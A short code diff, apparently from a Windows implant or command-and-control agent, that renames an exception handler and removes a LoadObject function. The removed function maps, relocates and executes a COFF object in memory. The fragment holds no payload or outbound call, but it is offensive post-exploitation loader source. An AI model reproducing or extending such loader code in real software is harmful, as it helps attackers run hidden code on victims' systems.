@@ -726,7 +726,7 @@ namespace Memory {
             char *symbol_name = { };
             void *exec = { };
 
-            if (!(veh_handler = Ctx->Nt.RtlAddVectoredExceptionHandler(1, &Veh::Debugger))) {
+            if (!(veh_handler = Ctx->Nt.RtlAddVectoredExceptionHandler(1, &Inject::Debugger))) {
                 return_defer(ERROR_INVALID_EXCEPTION_HANDLER);
             }
 
@@ -806,34 +806,5 @@ namespace Memory {
             return success;
         }
 
-        VOID LoadObject(const char *const entrypoint, uint8_t* const data, void* const args, size_t arg_size, uint32_t req_id) {
-            HEXANE
-
-            _executable *object = Methods::CreateImageData(B_PTR(data));
-
-            object->next    = Ctx->Coffs;
-            Ctx->Coffs      = object;
-
-            if (!Opsec::SeImageCheckArch(object)) {
-                return_defer(ntstatus);
-            }
-
-            if (!Objects::MapSections(object, data)) {
-                return_defer(ntstatus);
-            }
-
-            if (!Objects::BaseRelocation(object)) {
-                return_defer(ntstatus);
-            }
-
-            if (!ExecuteObject(object, entrypoint, args, arg_size, req_id)) {
-                return_defer(ntstatus);
-            }
-
-            defer:
-            if (ntstatus != ERROR_SUCCESS) {
-                Ctx->Nt.RtlFreeHeap(Ctx->Heap, 0, object);
-            }
-        }
     }
 }
